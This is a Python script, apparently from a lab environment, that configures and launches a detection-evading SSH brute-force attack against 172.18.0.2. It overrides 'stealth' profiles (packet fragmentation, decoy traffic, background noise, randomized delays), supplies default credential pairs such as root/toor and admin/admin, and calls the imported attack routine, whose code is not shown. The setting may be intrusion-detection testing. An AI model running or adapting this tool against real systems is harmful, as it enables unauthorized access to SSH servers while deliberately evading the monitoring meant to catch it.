#!/usr/bin/env python3
"""
Ultimate Stealth Test Version - Fast Testing
All techniques implemented but with faster timing for immediate testing
"""

import sys
import os
sys.path.append('/home/labctrl/Documents/snor/snorl_bruteforce')

# Import the main class and modify for testing
from ultimate_stealth_bruteforce import *

class UltimateStealthTester(UltraStealthBruteForcer):
    """Test version with faster timing"""
    
    def __init__(self, target_ip: str, target_port: int, protocol: str = "ssh"):
        super().__init__(target_ip, target_port, protocol)
        
        # Override profiles for faster testing
        self.profiles = {
            "ghost_mode": UltimateProfile(
                name="Ghost Mode (Test)",
                base_interval_minutes=(0.5, 2.0),   # 30 seconds - 2 minutes
                decoy_frequency=2.0,                # 2 decoys per attempt
                fragmentation_probability=0.8,       # 80% fragmentation
                connection_reuse_attempts=3,
                background_noise_level=0.7,
                stealth_level=StealthLevel.GHOST
            ),
            "extreme_stealth": UltimateProfile(
                name="Extreme Stealth (Test)",
                base_interval_minutes=(0.3, 1.5),   # 20 seconds - 1.5 minutes
                decoy_frequency=1.5,
                fragmentation_probability=0.6,
                connection_reuse_attempts=2,
                background_noise_level=0.5,
                stealth_level=StealthLevel.EXTREME
            )
        }
        
        self.active_profile = self.profiles["ghost_mode"]
        
        # Shorter credentials list for testing
        self.credentials = [
            ("root", "toor"),     # Known to work
            ("admin", "admin"),   # Known to work  
            ("test", "test"),     # Test account
            ("guest", "guest")    # Guest account
        ]
        
    def calculate_ultra_delay(self) -> float:
        """Faster delays for testing"""
        min_minutes, max_minutes = self.active_profile.base_interval_minutes
        
        # Base delay in minutes (much shorter)
        base_delay = random.uniform(min_minutes, max_minutes)
        
        # Add variability
        variability = np.random.lognormal(mean=0, sigma=0.3)
        final_delay_minutes = base_delay * variability
        
        # Convert to seconds with testing bounds
        final_delay_seconds = final_delay_minutes * 60
        final_delay_seconds = max(10, min(final_delay_seconds, 180))  # 10 seconds - 3 minutes
        
        self.log_ultimate_technique(
            "Ultra-Extended Timing (Test Mode)",
            f"Delay: {final_delay_seconds/60:.1f} minutes ({final_delay_seconds:.0f}s)"
        )
        
        return final_delay_seconds

def main():
    """Test execution"""
    print("👻 ULTIMATE STEALTH TEST VERSION")
    print("All techniques enabled with faster timing for testing")
    print("="*70)
    
    target_ip = "172.18.0.2"
    target_port = 22
    protocol = "ssh"
    
    tester = UltimateStealthTester(target_ip, target_port, protocol)
    
    print(f"🎯 Target: {target_ip}:{target_port}")
    print(f"📦 Packet Fragmentation: ✅ Enabled (80% probability)")
    print(f"🎭 Decoy Traffic: ✅ Enabled (2x campaigns)")  
    print(f"⏱️  Ultra Timing: ✅ Enabled (10s-3min delays)")
    print(f"🔄 Connection Reuse: ✅ Enabled")
    print(f"🌐 Background Noise: ✅ Enabled (0.7 intensity)")
    
    print("\n🚀 INITIATING ULTIMATE STEALTH TEST...")
    
    try:
        tester.execute_ultimate_attack()
    except KeyboardInterrupt:
        print("\n⚠️  Test interrupted")
    except Exception as e:
        print(f"\n❌ Test error: {e}")

if __name__ == "__main__":
    main()